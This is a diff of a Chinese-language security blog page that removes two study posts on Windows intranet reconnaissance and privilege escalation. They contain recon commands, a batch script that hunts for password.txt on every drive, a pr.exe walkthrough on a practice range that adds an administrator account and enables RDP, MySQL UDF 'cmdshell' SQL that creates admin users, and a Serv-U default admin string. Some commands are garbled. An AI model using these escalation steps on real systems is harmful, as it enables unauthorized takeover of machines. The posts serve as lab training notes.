-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="South'D 的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url">windows内网信息收集</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T23:31:41+08:00">
-                2020-01-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index">
-                    <span itemprop="name">内网</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578368440179.png" alt="1578368440179"></p>
-<h2 id="一、window机信息收集"><a href="#一、window机信息收集" class="headerlink" title="一、window机信息收集"></a>一、window机信息收集</h2><h3 id="低权限下的信息收集"><a href="#低权限下的信息收集" class="headerlink" title="低权限下的信息收集"></a>低权限下的信息收集</h3><table>
-<thead>
-<tr>
-<th></th>
-<th>基本情况</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td>用户列表</td>
-</tr>
-<tr>
-<td></td>
-<td>端口列表</td>
-</tr>
-<tr>
-<td></td>
-<td>进程列表</td>
-</tr>
-<tr>
-<td>低权限</td>
-<td>服务列表</td>
-</tr>
-<tr>
-<td></td>
-<td>查看系统软件安装</td>
-</tr>
-<tr>
-<td></td>
-<td>网络拓扑收集</td>
-</tr>
-<tr>
-<td></td>
-<td>网站敏感信息收集</td>
-</tr>
-<tr>
-<td></td>
-<td>系统补丁信息query</td>
-</tr>
-</tbody></table>
-<h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><table>
-<thead>
-<tr>
-<th>set</th>
-<th>查看系统的环境变量</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>query user</td>
-<td>查看当前在线的用户</td>
-</tr>
-<tr>
-<td>ipconfig /all</td>
-<td>查看当前机器的ip</td>
-</tr>
-<tr>
-<td>whoami</td>
-<td>查看当前用户</td>
-</tr>
-<tr>
-<td>netstat-ano</td>
-<td>查看有哪些网络连接端口</td>
-</tr>
-<tr>
-<td>net view</td>
-<td>查看在同一工作组中的机器</td>
-</tr>
-<tr>
-<td>net view /domain</td>
-<td>判断是否有域</td>
-</tr>
-</tbody></table>
-<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578361071602.png" alt="1578361071602"></p>
-<p>net1需要更高的权限（管理员）</p>
-<h3 id="用户列表"><a href="#用户列表" class="headerlink" title="用户列表"></a>用户列表</h3><table>
-<thead>
-<tr>
-<th align="left">net</th>
-<th>查看当前系统的用户</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">net1 user</td>
-<td>查看当前系统的用户</td>
-</tr>
-<tr>
-<td align="left">net user /domain</td>
-<td>查看当前域里面的用户</td>
-</tr>
-<tr>
-<td align="left">net user administrator</td>
-<td>查看当前用户的详细信息</td>
-</tr>
-<tr>
-<td align="left">net localgroup</td>
-<td>查看本地用户组</td>
-</tr>
-<tr>
-<td align="left">net localgroup administrators</td>
-<td>查看管理组中的成员</td>
-</tr>
-</tbody></table>
-<h3 id="端口列表"><a href="#端口列表" class="headerlink" title="端口列表"></a>端口列表</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363325521.png" alt="1578363325521"></p>
-<table>
-<thead>
-<tr>
-<th>netstat -an  #或获取系统当前开放的端口与端口连接信息</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-a显示所有连接和监听端口</td>
-</tr>
-<tr>
-<td>-n 以数字形式显示地址和端口</td>
-</tr>
-<tr>
-<td>-o显示与每个连接相关的所属进程ID</td>
-</tr>
-</tbody></table>
-<h3 id="进程列表"><a href="#进程列表" class="headerlink" title="进程列表"></a>进程列表</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363567752.png" alt="1578363567752"></p>
-<h3 id="服务列表"><a href="#服务列表" class="headerlink" title="服务列表"></a>服务列表</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363762540.png" alt="1578363762540"></p>
-<h3 id="查看软件安装"><a href="#查看软件安装" class="headerlink" title="查看软件安装"></a>查看软件安装</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578363911199.png" alt="1578363911199"></p>
-<h3 id="网络拓扑收集"><a href="#网络拓扑收集" class="headerlink" title="网络拓扑收集"></a>网络拓扑收集</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578364921033.png" alt="1578364921033"></p>
-<p>route print 查看路由表    </p>
-<p>arp -a 查看arp表</p>
-<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578365323796.png" alt="1578365323796"></p>
-<p>for /1 %i in (1 1 254 )do ping -n 192.168. 10.%%i&gt;&gt;qwe.txt</p>
-<h3 id="主动收集"><a href="#主动收集" class="headerlink" title="主动收集"></a>主动收集</h3><p>搜索文件</p>
-<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578366500526.png" alt="1578366500526"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">echo</span> off</span><br><span class="line">    set<span class="string">"FileName=password.txt"</span></span><br><span class="line">    <span class="keyword">echo</span> searching..</span><br><span class="line">    <span class="keyword">for</span> %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z)<span class="keyword">do</span>(</span><br><span class="line">    <span class="keyword">if</span> exist %%a:\(</span><br><span class="line">     <span class="keyword">for</span> /f<span class="string">"delims="</span>%%bin(<span class="string">'dir/a-d/s/b"%%a:\*%FileName%"2^&gt;nul'</span>)<span class="keyword">do</span>(</span><br><span class="line">     <span class="keyword">if</span>/i<span class="string">"%%~nxb"</span>equ<span class="string">"%FileName%"</span>(</span><br><span class="line">         <span class="keyword">echo</span>,%%b</span><br><span class="line">       )</span><br><span class="line">      )</span><br><span class="line">     )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
-
-<p>判断主机存活</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">echo</span> off </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /l %%i in (<span class="number">1</span> <span class="number">1</span> <span class="number">254</span> )<span class="keyword">do</span> ping -n <span class="number">192.168</span>. <span class="number">10.</span>%%i&gt;&gt;qwe.txt</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578366965382.png" alt="1578366965382"></p>
-<h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578367608470.png" alt="1578367608470"></p>
-<h2 id="二、window系统漏洞提权"><a href="#二、window系统漏洞提权" class="headerlink" title="二、window系统漏洞提权"></a>二、window系统漏洞提权</h2><p>SecWiki</p>
-<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578377564685.png" alt="1578377564685"></p>
-<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578377688016.png" alt="1578377688016"></p>
-<p>PR提权（巴西烤肉）</p>
-<p>pr提权（i春秋靶场）</p>
-<p>1、连接webshell</p>
-<p>2、尝试执行命令，发现不能执行</p>
-<p>3、上传cmd，右键终端打开</p>
-<p>4、执行whoami，发现普通用户，用管理员打开</p>
-<p>5、查看systeminfo，确定系统以及补丁</p>
-<p>6、利用漏洞、上传pr.exe</p>
-<p>7、pr.exe执行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pr.exe whoami</span><br><span class="line">systeminfo   (可以查补丁编号)</span><br><span class="line"></span><br><span class="line">pr.exe下尝试新建用户</span><br><span class="line">1，pr.exe &quot;net user&quot;</span><br><span class="line">2, pr.exe &quot;net user test123 Test#123&quot; &#x2F;add</span><br><span class="line"></span><br><span class="line">添加到管理组</span><br><span class="line">pr.exe &quot;net localgroup administrators test123 &#x2F;add&quot;</span><br><span class="line"></span><br><span class="line">查看一下端口是否开放</span><br><span class="line">pr exe &quot;netstat -ano&quot;</span><br><span class="line"></span><br><span class="line">pr.exe 3389.bat (3389运行过程)</span><br><span class="line">运行之后再查看3389是否开启：pr exe &quot;netstat -ano&quot;</span><br></pre></td></tr></table></figure>
-
-<p>8、远程连接mstsc</p>
-<p>chrome收藏夹文件位置</p>
-<p><img src="/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578381847818.png" alt="1578381847818"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/12/%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/hearder.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="South'D 的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/12/%E6%8F%90%E6%9D%83/" itemprop="url">提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-12T21:22:48+08:00">
-                2020-01-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index">
-                    <span itemprop="name">内网</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>前面回顾</p>
-<table>
-<thead>
-<tr>
-<th>windows（系统漏洞，ms系列）</th>
-<th>ms08-067、ms09-012、ms09-020、ms12-020、ms17-010、cve-2019-0708</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>linux(内核提权)</td>
-<td></td>
-</tr>
-<tr>
-<td>服务提权</td>
-<td>mysql、mssql、tomcat</td>
-</tr>
-<tr>
-<td>应用提权</td>
-<td>pacanwhere</td>
-</tr>
-</tbody></table>
-<h2 id="一、提权简介"><a href="#一、提权简介" class="headerlink" title="一、提权简介"></a>一、提权简介</h2><p>有时候，通多某些方式（如上传Webshell）获取执行命令的shell，但是会因为权限限制而无法执行某些命令。这时为了“扩大战果”就需要利用提权，来让原本的低权限（如只允许列目录） –&gt;高权限（新建系统管理员用户）。</p>
-<table>
-<thead>
-<tr>
-<th>提权分类：</th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>一、本地漏洞提权</td>
-<td>二、数据库提权</td>
-<td>三、其他软件提权</td>
-</tr>
-</tbody></table>
-<h3 id="本地漏洞提权"><a href="#本地漏洞提权" class="headerlink" title="本地漏洞提权"></a>本地漏洞提权</h3><p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578533090218.png" alt="1578533090218"></p>
-<p>msf  kali下的</p>
-<p>rpc 远程</p>
-<h2 id="二、数据库提权"><a href="#二、数据库提权" class="headerlink" title="二、数据库提权"></a>二、数据库提权</h2><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>利用mysql提权原理：</p>
-<p>1、具有mysql的root权限，且mysql以system权限运行</p>
-<p>2、具有执行sql语句的权限，webshell或者外连皆可</p>
-<hr>
-<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578533503159.png" alt="1578533503159"></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578533704114.png" alt="1578533704114"></p>
-<p>创建用户自定义函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create <span class="function"><span class="keyword">function</span> <span class="title">cmdshell</span> <span class="title">returns</span> <span class="title">string</span> <span class="title">soname</span> '<span class="title">udf</span>.<span class="title">dll</span>'</span>;</span><br><span class="line">select cmdshell(<span class="string">'net user waitalone wairalone.cn /add'</span>);</span><br><span class="line">select cmdshell(<span class="string">'net localgroup administrators waitalone /add'</span>);</span><br><span class="line">drop <span class="function"><span class="keyword">function</span> <span class="title">cmdshell</span></span>;删除函数</span><br><span class="line">delete from mysql.func where name=<span class="string">'cmdshell'</span>删除函数</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578533859757.png" alt="1578533859757"></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578533961031.png" alt="1578533961031"></p>
-<p>select @@basedir 查找目录</p>
-<p>dll编写：<img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578538331937.png" alt="1578538331937"></p>
-<h4 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h4><p>windows下(托管对象格式)<a href="https://www.bilibili.com/video/av73708474?p=7" target="_blank" rel="noopener">https://www.bilibili.com/video/av73708474?p=7</a></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578538476885.png" alt="1578538476885"></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578538519321.png" alt="1578538519321"></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578538605425.png" alt="1578538605425"></p>
-<h3 id="MSSQL数据库提权"><a href="#MSSQL数据库提权" class="headerlink" title="MSSQL数据库提权"></a>MSSQL数据库提权</h3><p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578550142679.png" alt="1578550142679"></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578550185087.png" alt="1578550185087"></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578550220825.png" alt="1578550220825"></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578550365698.png" alt="1578550365698"></p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578550543988.png" alt="1578550543988"></p>
-<p>freebuf.com/articles/web/55577.html</p>
-<h2 id="三、其他软件提权"><a href="#三、其他软件提权" class="headerlink" title="三、其他软件提权"></a>三、其他软件提权</h2><h3 id="Pcanwhere"><a href="#Pcanwhere" class="headerlink" title="Pcanwhere"></a>Pcanwhere</h3><p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578554198823.png" alt="1578554198823"></p>
-<h3 id="Serv-U"><a href="#Serv-U" class="headerlink" title="Serv-U"></a>Serv-U</h3><p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578554250227.png" alt="1578554250227"></p>
-<p>LocalAdministrator </p>
-<p>#@$ak#.lk;0@P</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578554432266.png" alt="1578554432266"></p>
-<p>tasklist     services为高权限</p>
-<p>​                 console为低权限</p>
-<p><img src="/2020/01/12/%E6%8F%90%E6%9D%83/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578554487355.png" alt="1578554487355"></p>
-<h2 id="靶场192-168-5-148"><a href="#靶场192-168-5-148" class="headerlink" title="靶场192.168.5.148"></a>靶场192.168.5.148</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3065,7 +3195,7 @@ cmd &gt;| file
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3087,7 +3217,7 @@ cmd &gt;| file
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
